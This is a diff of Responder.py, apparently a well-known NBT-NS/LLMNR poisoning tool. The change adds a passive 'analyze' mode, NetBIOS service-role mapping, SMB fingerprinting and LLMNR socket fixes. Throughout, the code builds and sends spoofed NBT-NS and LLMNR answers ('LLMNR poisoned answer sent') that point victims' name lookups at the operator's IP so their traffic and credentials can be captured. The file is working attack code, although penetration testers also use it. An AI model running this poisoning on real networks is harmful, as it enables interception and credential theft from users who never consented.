@@ -16,7 +16,7 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random,os,ConfigParser,BaseHTTPServer, select,urlparse,zlib
+import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random,os,ConfigParser,BaseHTTPServer, select,urlparse,zlib, string
 from SocketServer import TCPServer, UDPServer, ThreadingMixIn, StreamRequestHandler, BaseRequestHandler,BaseServer
 from Fingerprint import RunSmbFinger,OsNameClientVersion
 from odict import OrderedDict
@@ -26,6 +26,8 @@ from random import randrange
 parser = optparse.OptionParser(usage='python %prog -i 10.20.30.40 -b On -r On',
                                prog=sys.argv[0],
                                )
+parser.add_option('-A','--analyze', action="store_true", help="Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning anything.", metavar="10.20.30.40",dest="Analyse")
+
 parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")
 
 parser.add_option('-I','--interface', action="store", help="Network interface to use", metavar="eth0", dest="INTERFACE", default="Not set")
@@ -46,7 +48,7 @@ parser.add_option('-v',action="store_true", help="More verbose",dest="Verbose")
 
 options, args = parser.parse_args()
 
-if options.OURIP is None:
+if options.OURIP is None and options.Analyse is None:
    print "-i mandatory option is missing\n"
    parser.print_help()
    exit(-1)
@@ -86,6 +88,7 @@ Finger_On_Off = options.Finger.upper()
 INTERFACE = options.INTERFACE
 Verbose = options.Verbose
 Force_WPAD_Auth = options.Force_WPAD_Auth.upper()
+AnalyzeMode = options.Analyse
 
 if INTERFACE != "Not set":
    BIND_TO_Interface = INTERFACE
@@ -114,6 +117,12 @@ def OsInterfaceIsSupported(INTERFACE):
     if INTERFACE == "Not set":
        return False
 
+def Analyze(AnalyzeMode):
+    if AnalyzeMode == True:
+       return True
+    else:
+       return False
+
 #Logger
 import logging
 logging.basicConfig(filename=str(os.path.join(ResponderPATH,SessionLog)),level=logging.INFO,format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
@@ -122,6 +131,10 @@ logging.warning('Responder Started')
 Log2Filename = str(os.path.join(ResponderPATH,"LLMNR-NBT-NS.log"))
 logger2 = logging.getLogger('LLMNR/NBT-NS')
 logger2.addHandler(logging.FileHandler(Log2Filename,'w'))
+
+AnalyzeFilename = str(os.path.join(ResponderPATH,"Analyze-LLMNR-NBT-NS.log"))
+logger3 = logging.getLogger('Analyze LLMNR/NBT-NS')
+logger3.addHandler(logging.FileHandler(AnalyzeFilename,'w'))
 
 def Show_Help(ExtraHelpData):
    help = "NBT Name Service/LLMNR Responder 2.0.\nPlease send bugs/comments to: lgaffie@trustwave.com\nTo kill this script hit CRTL-C\n\n"
@@ -140,7 +153,7 @@ def WriteData(outfile,data, user):
           if re.search(user.encode('hex'), filestr.read().encode('hex')):
              filestr.close()
              return False
-          if re.search("\$", user):
+          if re.search(re.escape("$"), user):
              filestr.close()
              return False
           else:
@@ -157,7 +170,7 @@ def PrintData(outfile,user):
           if re.search(user.encode('hex'), filestr.read().encode('hex')):
              filestr.close()
              return False
-          if re.search("\$", user):
+          if re.search(re.escape("$"), user):
              filestr.close()
              return False
           else:
@@ -170,7 +183,7 @@ def PrintLLMNRNBTNS(outfile,Message):
        return True
     if os.path.isfile(outfile) == True:
        with open(outfile,"r") as filestr:
-          if re.search(Message, filestr.read()):
+          if re.search(re.escape(Message), filestr.read()):
              filestr.close()
              return False
           else:
@@ -186,10 +199,8 @@ for i in range(0,len(NumChal),2):
 
 Show_Help("[+]NBT-NS & LLMNR responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nResponder is bound to this interface:%s\nChallenge set is:%s\nWPAD Proxy Server is:%s\nWPAD script loaded:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nIMAP Server is:%s\nPOP3 Server is:%s\nSMTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\nServing Executable via HTTP&WPAD is:%s\nAlways Serving a Specific File via HTTP&WPAD is:%s\n\n"%(BIND_TO_Interface, NumChal,WPAD_On_Off,WPAD_Script,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,IMAP_On_Off,POP_On_Off,SMTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
 
-#Simple NBNS Services.
-W_REDIRECT   = "\x41\x41\x00"
-FILE_SERVER  = "\x43\x41\x00"
-
+if AnalyzeMode:
+   print '[+]Responder is in analyze mode. No NBT-NS/LLMNR requests will be poisoned.\n'
 
 #Packet class handling all packet generation (see odict.py).
 class Packet():
@@ -252,12 +263,31 @@ class NBT_Ans(Packet):
         self.fields["NbtName"] = data[12:46]
         self.fields["IP"] = inet_aton(OURIP)
 
+def NBT_NS_Role(data):
+    Role = {
+        "\x41\x41\x00":"Workstation/Redirector Service",
+        "\x42\x4c\x00":"Domain Master Browser. This name is likely a domain controller if any, according to MSFT specs.)",
+        "\x42\x4d\x00":"Domain controller service. This name is a domain controller.",
+        "\x42\x4e\x00":"Local Master Browser",
+        "\x42\x4f\x00":"Browser Election Service.",
+        "\x43\x41\x00":"File Server Service",
+        "\x41\x42\x00":"Browser Service",
+    }
+
+    if data in Role:
+        return Role[data]
+    else:
+        return "Service not known."
+
 # Define what are we answering to.
 def Validate_NBT_NS(data,Wredirect):
-    if FILE_SERVER == data[43:46]:
+    if Analyze(AnalyzeMode):
+       #print NBT_NS_Role(data[43:46])
+       return False
+    if NBT_NS_Role(data[43:46]) == "File Server Service":
        return True
     if Wredirect == "ON":
-       if W_REDIRECT == data[43:46]:
+       if NBT_NS_Role(data[43:46]) == "Workstation/Redirector Service":
           return True
     else:
        return False
@@ -271,7 +301,7 @@ def Decode_Name(nbname):
        for i in range(0, 32, 2):
           l.append(chr(((ord(nbname[i]) - 0x41) << 4) |
                      ((ord(nbname[i+1]) - 0x41) & 0xf)))
-       return ''.join(l).split('\x00', 1)[0].strip()
+       return filter(lambda x: x in string.printable, ''.join(l).split('\x00', 1)[0].replace(' ', ''))
     except:
        return "Illegal NetBIOS name"
 
@@ -282,7 +312,26 @@ class NB(BaseRequestHandler):
         request, socket = self.request
         data = request
         Name = Decode_Name(data[13:45])
-        if RespondToSpecificHost(RespondTo):
+
+        if Analyze(AnalyzeMode):
+           if data[2:4] == "\x01\x10":
+              if Is_Finger_On(Finger_On_Off):
+                 try:
+                    Finger = RunSmbFinger((self.client_address[0],445))
+                    Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s.\nOs Version is: %s Client Version is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]),Finger[0],Finger[1])
+                    logger3.warning(Message)
+                 except Exception:
+                    Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s\n"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
+                    logger3.warning(Message)
+                 if PrintLLMNRNBTNS(AnalyzeFilename,Message):
+                    print Message
+              else:
+                 Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
+                 if PrintLLMNRNBTNS(AnalyzeFilename,Message):
+                    print Message
+                 logger3.warning(Message)
+           
+        if RespondToSpecificHost(RespondTo) and Analyze(AnalyzeMode) == False:
            if RespondToIPScope(RespondTo, self.client_address[0]):
               if data[2:4] == "\x01\x10":
                  if Validate_NBT_NS(data,Wredirect):
@@ -290,7 +339,7 @@ class NB(BaseRequestHandler):
                     buff.calculate(data)
                     for x in range(1):
                        socket.sendto(str(buff), self.client_address)
-                       Message = 'NBT-NS Answer sent to: %s. The requested name was : %s.'%(self.client_address[0], Name)
+                       Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
                        logging.warning(Message)
                        if PrintLLMNRNBTNS(Log2Filename,Message):
                           print Message
@@ -298,6 +347,8 @@ class NB(BaseRequestHandler):
                        if Is_Finger_On(Finger_On_Off):
                           try:
                              Finger = RunSmbFinger((self.client_address[0],445))
+                             print '[+] OsVersion is:%s'%(Finger[0])
+                             print '[+] ClientVersion is :%s'%(Finger[1])
                              logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                              logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                           except Exception:
@@ -308,12 +359,12 @@ class NB(BaseRequestHandler):
 
         else:
            if data[2:4] == "\x01\x10":
-              if Validate_NBT_NS(data,Wredirect):
+              if Validate_NBT_NS(data,Wredirect) and Analyze(AnalyzeMode) == False:
                  buff = NBT_Ans()
                  buff.calculate(data)
                  for x in range(1):
                     socket.sendto(str(buff), self.client_address)
-                 Message = 'NBT-NS Answer sent to: %s. The requested name was : %s.'%(self.client_address[0], Name)
+                 Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
                  logging.warning(Message)
                  if PrintLLMNRNBTNS(Log2Filename,Message):
                     print Message
@@ -321,6 +372,8 @@ class NB(BaseRequestHandler):
                  if Is_Finger_On(Finger_On_Off):
                     try:
                        Finger = RunSmbFinger((self.client_address[0],445))
+                       print '[+] OsVersion is:%s'%(Finger[0])
+                       print '[+] ClientVersion is :%s'%(Finger[1])
                        logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                        logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                     except Exception:
@@ -330,34 +383,55 @@ class NB(BaseRequestHandler):
 ##################################################################################
 #Browser Listener
 ##################################################################################
-def FindPDC(data,Client):
+def BecomeBackup(data,Client):
     DataOffset = struct.unpack('<H',data[139:141])[0]
     BrowserPacket = data[82+DataOffset:]
-    if BrowserPacket[0] == "\x0c":
-       Domain = ''.join(tuple(BrowserPacket[6:].split('\x00'))[:1])
-       if Domain == "WORKGROUP":
-          print "[Browser]Received announcement for Workgroup.. ignoring"
-       elif Domain == "MSHOME":
-          print "[Browser]Received announcement for MSHOME.. ignoring"
+    if BrowserPacket[0] == "\x0b":
+       ServerName = BrowserPacket[1:]
+       if Is_Finger_On(Finger_On_Off):
+          try:
+              Finger = RunSmbFinger((self.client_address[0],445))
+              Message = "[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s wants to become a backup browser (Local Master Browser backup) on this domain: %s.\nOs Version is: %s Client Version is: %s"%(Client, Decode_Name(data[15:47]),NBT_NS_Role(data[45:48]),Decode_Name(data[49:81]),Finger[0],Finger[1])
+              logger3.warning(Message)
+          except Exception:
+              Message = "[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s wants to become a backup browser (Local Master Browser backup) on this domain: %s."%(Client, Decode_Name(data[15:47]),NBT_NS_Role(data[45:48]),Decode_Name(data[49:81]))
+              logger3.warning(Message)
        else:
-          print "[Browser]PDC ip address is: ",Client
-          logging.warning('[Browser] PDC ip address is: %s'%(Client))
-          print "[Browser]PDC Domain Name is: ", Domain
-          logging.warning('[Browser]PDC Domain Name is: %s'%(Domain))
-          ServerName = BrowserPacket[6+16+10:]
-          print "[Browser]PDC Machine Name is: ", ServerName.replace("\x00","")
-          logging.warning('[Browser]PDC Machine Name is: %s'%(ServerName.replace("\x00","")))
+           Message = "[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s wants to become a backup browser (Local Master Browser backup) on this domain: %s."%(Client, Decode_Name(data[15:47]),NBT_NS_Role(data[45:48]),Decode_Name(data[49:81]))
+           if PrintLLMNRNBTNS(AnalyzeFilename,Message):
+              print Message
+           logger3.warning(Message)
     else:
        pass
+
+def ParseDatagramNBTNames(data,Client):
+    if Is_Finger_On(Finger_On_Off):
+       try:
+          Finger = RunSmbFinger((Client,445))
+          Message = '[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s to: %s. Service: %s\nOs Version is: %s Client Version is: %s'%(Client, Decode_Name(data[15:47]),NBT_NS_Role(data[45:48]),Decode_Name(data[49:81]), NBT_NS_Role(data[79:82]),Finger[0],Finger[1])
+          logger3.warning(Message)
+       except Exception:
+          Message = '[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s to: %s. Service: %s'%(Client, Decode_Name(data[15:47]),NBT_NS_Role(data[45:48]),Decode_Name(data[49:81]), NBT_NS_Role(data[79:82]))
+          logger3.warning(Message)
+       if PrintLLMNRNBTNS(AnalyzeFilename,Message):
+          print Message
+    else:
+       Message = '[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s to: %s. Service: %s'%(Client, Decode_Name(data[15:47]),NBT_NS_Role(data[45:48]),Decode_Name(data[49:81]), NBT_NS_Role(data[79:82]))
+       logger3.warning(Message)
+       if PrintLLMNRNBTNS(AnalyzeFilename,Message):
+          print Message
 
 class Browser(BaseRequestHandler):
 
     def handle(self):
         try:
            request, socket = self.request
-           FindPDC(request,self.client_address[0])
+           if Analyze(AnalyzeMode):
+              ParseDatagramNBTNames(request,self.client_address[0])
+              BecomeBackup(request,self.client_address[0])
+           BecomeBackup(request,self.client_address[0])
         except Exception:
-           pass
+           raise
 ##################################################################################
 #SMB Server
 ##################################################################################
@@ -821,11 +895,14 @@ def Parse_LLMNR_Name(data,addr):
    return Name
 
 def Parse_IPV6_Addr(data):
-    Len = len(data)
-    if data[Len-4:Len][1] =="\x1c":
+    if data[len(data)-4:len(data)][1] =="\x1c":
        return False
-    else:
+    if data[len(data)-4:len(data)] == "\x00\x01\x00\x01":
        return True
+    if data[len(data)-4:len(data)] == "\x00\xff\x00\x01":
+       return True
+    else:
+       return False
 
 def FindLocalIP(Iface):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -838,12 +915,12 @@ def RunLLMNR():
       ALL = '0.0.0.0'
       MADDR = "224.0.0.252"
       MPORT = 5355
-      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
       if IsOsX():
           print "OsX Bind to interface is not supported..Listening on all interfaces."
       if OsInterfaceIsSupported(INTERFACE):
          try:
             IP = FindLocalIP(BIND_TO_Interface)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
             s.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
             s.bind((ALL,MPORT))
             s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
@@ -854,6 +931,7 @@ def RunLLMNR():
             sys.exit(1)
 
       else:
+         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
          s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
          s.bind((ALL,MPORT))
          s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
@@ -863,48 +941,74 @@ def RunLLMNR():
    while True:
        try:
           data, addr = s.recvfrom(1024)
+          if Analyze(AnalyzeMode):
+             if data[2:4] == "\x00\x00":
+                if Parse_IPV6_Addr(data):
+                    Name = Parse_LLMNR_Name(data,addr)
+                    if Is_Finger_On(Finger_On_Off):
+                       try:
+                          Finger = RunSmbFinger((addr[0],445))
+                          Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s.\nOs Version is: %s Client Version is: %s"%(addr[0], Name,Finger[0],Finger[1])
+                          logger3.warning(Message)
+                       except Exception:
+                          Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(addr[0], Name)
+                          logger3.warning(Message)
+                       if PrintLLMNRNBTNS(AnalyzeFilename,Message):
+                          print Message
+                    else:
+                       Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(addr[0], Name)
+                       if PrintLLMNRNBTNS(AnalyzeFilename,Message):
+                          print Message
+                       logger3.warning(Message)
+
           if RespondToSpecificHost(RespondTo):
-             if RespondToIPScope(RespondTo, addr[0]):
-                if data[2:4] == "\x00\x00":
+             if Analyze(AnalyzeMode) == False:
+                if RespondToIPScope(RespondTo, addr[0]):
+                   if data[2:4] == "\x00\x00":
+                      if Parse_IPV6_Addr(data):
+                         Name = Parse_LLMNR_Name(data,addr)
+                         buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
+                         buff.calculate()
+                         for x in range(1):
+                            s.sendto(str(buff), addr)
+                         Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(addr[0],Name)
+                         logging.warning(Message)
+                         if PrintLLMNRNBTNS(Log2Filename,Message):
+                            print Message
+                            logger2.warning(Message)
+                         if Is_Finger_On(Finger_On_Off):
+                            try:
+                               Finger = RunSmbFinger((addr[0],445))
+                               print '[+] OsVersion is:%s'%(Finger[0])
+                               print '[+] ClientVersion is :%s'%(Finger[1])
+                               logging.warning('[+] OsVersion is:%s'%(Finger[0]))
+                               logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                            except Exception:
+                               logging.warning('[+] Fingerprint failed for host: %s'%(addr[0]))
+                               pass
+          else:
+             if data[2:4] == "\x00\x00":
+                if Analyze(AnalyzeMode) == False:
                    if Parse_IPV6_Addr(data):
                       Name = Parse_LLMNR_Name(data,addr)
                       buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
                       buff.calculate()
+                      Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(addr[0],Name)
                       for x in range(1):
                          s.sendto(str(buff), addr)
-                      Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(addr[0],Name)
-                      logging.warning(Message)
                       if PrintLLMNRNBTNS(Log2Filename,Message):
                          print Message
                          logger2.warning(Message)
                       if Is_Finger_On(Finger_On_Off):
                          try:
                             Finger = RunSmbFinger((addr[0],445))
+                            print '[+] OsVersion is:%s'%(Finger[0])
+                            print '[+] ClientVersion is :%s'%(Finger[1])
                             logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                             logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                          except Exception:
                             logging.warning('[+] Fingerprint failed for host: %s'%(addr[0]))
                             pass
-          else:
-             if data[2:4] == "\x00\x00":
-                if Parse_IPV6_Addr(data):
-                   Name = Parse_LLMNR_Name(data,addr)
-                   buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
-                   buff.calculate()
-                   Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(addr[0],Name)
-                   for x in range(1):
-                      s.sendto(str(buff), addr)
-                   if PrintLLMNRNBTNS(Log2Filename,Message):
-                      print Message
-                      logger2.warning(Message)
-                   if Is_Finger_On(Finger_On_Off):
-                      try:
-                         Finger = RunSmbFinger((addr[0],445))
-                         logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                         logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
-                      except Exception:
-                         logging.warning('[+] Fingerprint failed for host: %s'%(addr[0]))
-                         pass
        except:
           raise
 
